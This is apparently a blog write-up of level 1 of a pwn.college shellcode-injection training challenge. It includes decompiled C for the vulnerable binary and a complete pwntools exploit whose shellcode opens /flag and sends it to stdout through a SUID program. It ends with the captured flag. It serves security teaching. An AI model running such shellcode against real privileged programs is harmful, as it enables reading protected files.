---
title: "Write-ups: Program Security (Shellcode Injection) series"
pubDate: 2024-12-24
categories: ["Pwn", "Write-ups", "Shellcode"]
description: "Write-ups for pwn.college binary exploitation series."
slug: shellcode-injection
---

## Table of contents

## Level 1

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag!

### Write-up

```plaintext showLineNumbers=false del={8}
pwndbg> checksec
File:     /home/cub3y0nd/Projects/pwn.college/babyshell-level-1
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

```c del={43, 50} collapse={1-39}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v10[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v11; // [rsp+1048h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v10;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v10);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-1.c", 0x69u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2565);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

够简单的吧，stack rwx，`((void (*)(void))shellcode)();` 把 `buf` 的地址强制转换为函数指针，执行我们的输入内容。

### Exploit

由于是 SUID 程序，以程序所有者权限运行。所以我们的思路是通过 `sendfile(0x1, open("/flag", 0x0, 0x0), 0x0, 0x1000)` 直接输出 `/flag` 的内容：

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babyshell-level-1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
        mov rax, 0x67616c662f
        push rax
        lea rdi, [rsp]
        mov rsi, 0x0
        mov rdx, 0x0
        mov rax, 0x2
        syscall

        mov rdi, 0x1
        mov rsi, rax
        mov rdx, 0x0
        mov rcx, 0x1000
        mov rax, 0x28
        syscall

        mov rdi, 0x0
        mov rax, 0x3c
        syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{s4taPKpK1SzfB3gWK--PDuB4Xwx.01NxIDL5cTNxgzW}`

